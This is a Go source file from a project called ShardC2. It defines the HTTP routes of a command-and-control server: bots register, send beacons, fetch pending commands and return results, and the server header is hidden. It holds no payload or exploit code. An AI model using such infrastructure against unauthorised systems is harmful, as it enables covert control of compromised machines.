package server

import (
	"fmt"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/cors"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/internal/server/handlers"
)

type Server struct {
	app *fiber.App
	db  *database.DB
}

func New(db *database.DB) *Server {
	app := fiber.New(fiber.Config{
		ServerHeader:          "",
		DisableStartupMessage: true,
		AppName:               "ShardC2",
	})

	app.Use(recover.New())
	app.Use(cors.New())
	app.Use(logger.New(logger.Config{
		Format: "${time} | ${status} | ${latency} | ${ip} | ${method} ${path}\n",
	}))

	s := &Server{app: app, db: db}
	s.setupRoutes()
	return s
}

func (s *Server) setupRoutes() {
	api := s.app.Group("/api/v1")

	botHandler := handlers.NewBotHandler(s.db)
	cmdHandler := handlers.NewCommandHandler(s.db)

	// Bot management
	bots := api.Group("/bots")
	bots.Post("/register", botHandler.Register)
	bots.Post("/beacon", botHandler.Beacon)
	bots.Get("/", botHandler.List)
	bots.Get("/:id", botHandler.Get)
	bots.Delete("/:id", botHandler.Remove)

	// Command management
	cmds := api.Group("/commands")
	cmds.Post("/", cmdHandler.Create)
	cmds.Get("/pending/:bot_id", cmdHandler.GetPending)
	cmds.Post("/result", cmdHandler.SubmitResult)
	cmds.Get("/history/:bot_id", cmdHandler.History)

	// Health check
	api.Get("/health", func(c *fiber.Ctx) error {
		return c.JSON(fiber.Map{"status": "ok", "service": "shardc2"})
	})

	// Stats
	api.Get("/stats", botHandler.Stats)
}

func (s *Server) Start(addr string) error {
	fmt.Printf("[*] C2 Server listening on %s\n", addr)
	return s.app.Listen(addr)
}

func (s *Server) Shutdown() error {
	return s.app.Shutdown()
}
